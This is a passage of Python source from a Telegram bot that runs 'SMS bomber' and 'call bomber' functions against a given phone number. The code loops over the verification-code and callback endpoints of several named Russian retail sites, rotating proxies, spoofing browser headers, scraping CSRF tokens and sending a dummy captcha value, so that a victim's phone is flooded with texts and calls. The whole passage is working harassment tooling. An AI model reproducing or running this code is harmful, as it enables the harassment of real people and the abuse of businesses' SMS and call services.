                    "Cookie": f"OCSESSID={cookies['OCSESSID']}; language=ru-ru; currency=RUB; city_id=1; _gcl_au=1.1.1069651236.1658823555; _ga=GA1.2.1256972918.1658823558; _gid=GA1.2.322117990.1658823558; _gat_UA-180861706-2=1; _ym_uid=1658823559889884035; _ym_d=1658823559; _ym_isad=2; _fbp=fb.1.1658823558910.2018902709; _ym_visorc=w; time_spent=14",
                    "Host": "smartchef.ru",
                    "Referer": "https://smartchef.ru/login",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-Requested-With": "XMLHttpRequest",
                },
                params={
                    "route": "account/login/sendSmsCode",
                    "telephone": phone,
                    "page": "register",
                },
                proxies=prox,
            )

            req = session.post(
                f"https://smartchef.ru/index.php?route=account/login/sendSmsCode&telephone={phone}&page=login",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Cookie": f"OCSESSID={cookies['OCSESSID']}; language=ru-ru; currency=RUB; city_id=1; _gcl_au=1.1.1069651236.1658823555; _ga=GA1.2.1256972918.1658823558; _gid=GA1.2.322117990.1658823558; _gat_UA-180861706-2=1; _ym_uid=1658823559889884035; _ym_d=1658823559; _ym_isad=2; _fbp=fb.1.1658823558910.2018902709; _ym_visorc=w; time_spent=14",
                    "Host": "smartchef.ru",
                    "Referer": "https://smartchef.ru/login",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-Requested-With": "XMLHttpRequest",
                },
                params={
                    "route": "account/login/sendSmsCode",
                    "telephone": phone,
                    "page": "login",
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            session = requests.session()
            req = session.get(
                "https://airsoft-rus.ru/",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            req = session.post(
                "https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "cookie": f"PHPSESSID={cookies['PHPSESSID']}; _ym_uid=1658824254895665648; _ym_d=1658824254; _ga=GA1.2.1612844392.1658824254; _gid=GA1.2.2108074592.1658824254; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1658869140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; _gat=1; BX_USER_ID=ce00b71005dbce5dde08f3815468ec99; BXMT_PHONE=%2B{phone[0]}({phone[1:4]}){phone[4:7]}-{phone[7:9]}-{phone[9:11]}",
                    "origin": "https://airsoft-rus.ru",
                    "referer": "https://airsoft-rus.ru/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "phone": f"+{phone[0]}({phone[1:4]}){phone[4:7]}-{phone[7:9]}-{phone[9:11]}",
                    "register": "true",
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            session = requests.session()
            req = session.get(
                "https://poisondrop.ru/auth/identification",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            req = session.post(
                "https://poisondrop.ru/auth/identification",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Cookie": f'uid_nginx={cookies["uid_nginx"]}; rr-testCookie=testvalue; rrpvid=276086286907176; _ga=GA1.2.793805425.1658825057; _gid=GA1.2.1611169535.1658825057; _dc_gtm_UA-42461087-1=1; pages-count=1; _ym_uid=1658825058468559749; _ym_d=1658825058; _spx=eyJpZCI6ImE0ZmYwZGM0LThiODItNGVkMy05YjI5LWE3MzUxYjk3NmM4YiIsImZpeGVkIjp7InN0YWNrIjpbMF19fQ%3D%3D; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=c9556a22-6ef4-4e88-80bb-c2613d9df0d4; rcuid=62aa1a9fef1bd1000185b3d2; _rc=42cfca14bea94e49bf059a5de2bd86dc; geolocation=%D0%9A%D0%B5%D0%BC%D0%B5%D1%80%D0%BE%D0%B2%D0%BE%2C%20%D0%9A%D0%B5%D0%BC%D0%B5%D1%80%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%20-%20%D0%9A%D1%83%D0%B7%D0%B1%D0%B0%D1%81%D1%81%2C%20%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%2C%20undefined%2C%20null%2C%20null; watch-geo-autodetect=1; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1658825057880.1303445971; XSRF-TOKEN={cookies["XSRF-TOKEN"]}; poisondrop_session={cookies["poisondrop_session"]}; _tt_enable_cookie=1; _ttp=35ce09e7-9a66-4219-a725-eec9f2e3e698; adrdel=1; adrcid=ABeP_N_QeutVfA_Yts0Qqaw',
                    "Host": "poisondrop.ru",
                    "Origin": "https://poisondrop.ru",
                    "Referer": "https://poisondrop.ru/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-XSRF-TOKEN": f'{cookies["XSRF-TOKEN"][:-3]}=',
                },
                json={"ident_method": "PHONE", "login": f"+{phone}"},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            session = requests.session()
            req = session.get(
                "https://www.zlato-grad.ru/",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            soup = bs(req.text, "lxml")

            sessid = soup.find("input", id="sessid")["value"]
            req = session.post(
                "https://www.zlato-grad.ru/",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "cookie": f"PHPSESSID={cookies['PHPSESSID']}; _ga=GA1.2.1722170754.1658831005; _gid=GA1.2.203777725.1658831005; _gat=1; _gat_gtag_UA_126205809_1=1; _ym_uid=1658831005603386330; _ym_d=1658831005; _ym_isad=2; _ym_visorc=w; mgo_sb_migrations=1418474375998%253D1; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fwww.zlato-grad.ru%252F; mgo_uid=NaKiAq8yJLaJ6kkv6bJ1; mgo_cnt=1; mgo_sid=61curfmi7111001ficsz; BX_USER_ID=ce00b71005dbce5dde08f3815468ec99",
                    "origin": "https://www.zlato-grad.ru",
                    "referer": "https://www.zlato-grad.ru/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "method": "get_code",
                    "phone": f"+{phone[0]} ({phone[1:4]}) {phone[4:7]}-{phone[7:9]}-{phone[9:11]}",
                    "sessid": sessid,
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            session = requests.session()
            req = session.get(
                "https://belwest.ru/ru/register",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            soup = bs(req.text, "lxml")

            xsrf = soup.find("input", {"name": "CSRFToken"})["value"]
            req = session.post(
                "https://belwest.ru/ru/register/sendCode",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "cookie": f"domain_ref=www.google.com; _gid=GA1.2.4065917.1658824866; _ym_uid=1658824866828249405; _ym_d=1658824866; city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region=%7B%22isocode%22%3A%22RU-MOW%22%2C%22isocodeShort%22%3A%22MOW%22%2C%22countryIso%22%3A%22RU%22%2C%22name%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22siteUid%22%3A%22belwest-ru-mow%22%2C%22lastRegionIso%22%3Anull%2C%22frontName%22%3A%22%D0%93%D0%BE%D1%80%D0%BE%D0%B4+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22fiasCode%22%3A%2277%22%7D; _ym_isad=2; cookie-notification=ACCEPTED; JSESSIONID={cookies['JSESSIONID']}; _ym_visorc=w; _ga=GA1.2.2137202047.1658824866; _ga_2YRZCT7RNL=GS1.1.1658831936.3.1.1658831988.0",
                    "origin": "https://belwest.ru",
                    "referer": "https://belwest.ru/ru/register",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "mobileNumber": phone[1:],
                    "mobileNumberCode": phone[0],
                    "CSRFToken": xsrf,
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            session = requests.session()
            req = session.post(
                "https://avtoset.su/",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            req = requests.post(
                "https://avtoset.su/local/components/netex/confirm.phone/confirmCode.php",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "cookie": f"PHPSESSID={cookies['PHPSESSID']}; LIVECHAT_GUEST_HASH={cookies['LIVECHAT_GUEST_HASH']}; BITRIX_SM_GUEST_ID={cookies['BITRIX_SM_GUEST_ID']}; BITRIX_SM_LAST_ADV=5_Y; BITRIX_SM_SALE_UID={cookies['BITRIX_SM_SALE_UID']}; _ym_debug=null; _ym_uid=1658833752208890230; _ym_d=1658833752; _ga=GA1.2.1504760508.1658833752; _gid=GA1.2.1854507916.1658833752; _gat_UA-110389290-1=1; _ym_isad=2; _ym_visorc=w; roistat_first_visit=2408734; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; roistat_visit=2408734; BX_USER_ID=ce00b71005dbce5dde08f3815468ec99; roistat_marker=seo_google_; roistat_marker_old=seo_google_; roistat_cookies_to_resave=roistat_ab%2Croistat_visit%2Croistat_marker%2Croistat_marker_old; ___dc=328e74bc-53f8-454f-8dc7-e7d5c6e1682b; BITRIX_SM_LAST_VISIT=26.07.2022%2014%3A09%3A23",
                    "origin": "https://avtoset.su",
                    "referer": "https://avtoset.su/auth/registration/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "type": "sendCode",
                    "phone": phone[1:],
                    "g-recaptcha-response": "empty",
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
    try:
        server_sms_update(sms)
    except:
        pass
    if phone in bomber_active:
        try:
            bomber_stop(
                datetime.datetime.now().strftime("%d.%m.%Y %S:%M:%H"),
                task_id,
                "Достигнуто максимальное время работы",
            )
            bomber_active.remove(phone)
            limits_update(userid, -1)
        except:
            pass

        kb = InlineKeyboardButton(text="↪️ Назад", callback_data="back1")
        keyboard = InlineKeyboardMarkup().add(kb)
        try:
            bot.edit_message_text(
                "<b>Бомбер завершил свою работу</b>",
                userid,
                message_id,
                parse_mode="HTML",
                reply_markup=keyboard,
            )
        except:
            pass


def call_bomber(userid, task_id, timer, phone, message_id):
    call = 0
    deadline = datetime.datetime.now() + datetime.timedelta(minutes=timer)
    while datetime.datetime.now() < deadline and phone in bomber_active:
        prox = {
            "http": f"http://{random.choice(proxy)}",
            "https": f"http://{random.choice(proxy)}",
        }
        try:
            session = requests.session()
            req = session.get(
                "https://lenta.com",
                headers={
                    "User-Agent": ua,
                },
            )

            cookies = req.cookies.get_dict()

            req = session.post(
                "https://lenta.com/api/v1/registration/requestcallcode",
                headers={
                    "Accept": "application/json",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Cookie": f'.ASPXANONYMOUS={cookies[".ASPXANONYMOUS"]}; CustomerId={cookies["CustomerId"]}; ShouldSetDeliveryOptions=True; DontShowCookieNotification=true; cookiesession1={cookies["cookiesession1"]}; _gcl_au=1.1.206335808.1656160140; _ym_d=1656160141; _ym_uid=1656160141947089066; KFP_DID=481fe63c-798e-491a-e46c-9bc2219c0ab9; tmr_lvid=4283edcf490ef046d8d75deacb7607ec; tmr_lvidTS=1656160141117; _ga=GA1.2.995018451.1656160141; _tm_lt_sid=1656160140812.66658; _a_d3t6sf=dukPiKdXZr_1OPbsz1ZgqSzn; _ttp=925061ee-6cdf-4f82-9947-7803e235a8f7; _tt_enable_cookie=1; flocktory-uuid=0b79c1f5-dcb5-4f2c-9939-c85e80debfd3-3; oxxfgh=8cb885de-bf63-43b6-bc79-5920a0ec89e3#0#5184000000#5000#1800000#44965; _fbp=fb.1.1656681413193.866632887;'
                    + ' _gpVisits={"isFirstVisitDomain":true,"todayD":"Fri%20Jul%2001%202022","idContainer":"100024D0"}; afUserId=8f46e511-2725-4cd3-8c85-13b41b5b17cb-p; ASP.NET_SessionId=qnswj5vxh5iylbehyzqgeuiu; _ym_visorc=w; _ym_isad=2; _gid=GA1.2.1716894665.1658817845; _dc_gtm_UA-327775-35=1; _gat_UA-327775-1=1; _gat_UA-327775-30=1; tmr_reqNum=94; tmr_detect=0%7C1658817851928',
                    "Host": "lenta.com",
                    "Origin": "https://lenta.com",
                    "Referer": "https://lenta.com/npl/authentication/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                },
                json={"phoneNumber": phone[1:]},
                proxies=prox,
            )
            call += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            req = requests.post(
                "https://api.eda1.ru/api/user/register",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json;charset=UTF-8",
                    "Host": "api.eda1.ru",
                    "Origin": "https://www.eda1.ru",
                    "Referer": "https://www.eda1.ru/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "sitenew": "1",
                    "User-Agent": ua,
                    "uuid": "85d894d8-4cb1-195f-80ba-6dbbf228a70a",
                    "X-Api-Key": "5833840",
                },
                json={
                    "password": "qwerty",
                    "password_repeat": "qwerty",
                    "phone": phone[1:],
                    "verify_type": "call",
                },
                proxies=prox,
            )
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

    try:
        server_call_update(call)
    except:
        pass
    if phone in bomber_active:
        try:
            bomber_stop(
                datetime.datetime.now().strftime("%d.%m.%Y %S:%M:%H"),
                task_id,
                "Достигнуто максимальное время работы",
            )
            bomber_active.remove(phone)
            limits_update(userid, -1)
        except:
            pass

        kb = InlineKeyboardButton(text="↪️ Назад", callback_data="back1")
        keyboard = InlineKeyboardMarkup().add(kb)
        try:
            bot.edit_message_text(
                "<b>Бомбер завершил свою работу</b>",
                userid,
                message_id,
                parse_mode="HTML",
                reply_markup=keyboard,
            )
        except:
            pass
